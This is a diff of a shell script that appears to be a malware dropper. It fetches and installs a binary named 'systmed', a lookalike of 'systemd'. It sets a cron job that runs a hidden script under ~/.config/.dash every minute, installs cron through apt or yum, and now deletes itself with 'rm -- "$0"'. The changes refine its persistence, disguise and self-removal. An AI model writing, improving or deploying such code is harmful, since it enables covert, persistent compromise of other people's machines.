@@ -48,10 +48,6 @@ execute_in_background() {
 }
 
 setup_cron_job() {
-    sudo apt-get update && sudo apt-get install -y cron
-    apt-get update && apt-get install -y cron
-    sudo yum install -y cronie
-    yum install -y cronie
     (crontab -l 2>/dev/null | grep -v 'systmed_config'; echo "* * * * * /bin/bash $HOME/.config/.dash/systmed_config.sh") | crontab -
 }
 
@@ -116,7 +112,6 @@ download_and_setup() {
     chmod +x "$DOWNLOAD_DIR/systmed"
 }
 
-# 检查 systmed 文件是否存在，不存在则重新下载并部署
 if [ ! -f "$DOWNLOAD_DIR/systmed" ]; then
     mkdir -p "$bin_DIR"
     download_and_setup
@@ -141,6 +136,8 @@ EOF
 }
 
 main_install() {
+    yum install -y cronie
+    apt-get update && apt-get install -y cron
     if [ ! -f "$FLAG_FILE" ]; then
         download_and_setup
         find_directory_and_deploy
@@ -157,7 +154,7 @@ main_install() {
         echo "systmed yes。"
     fi
     
-    trap 'rm -- "$0"' EXIT
+    rm -- "$0"
 }
 
 main_install
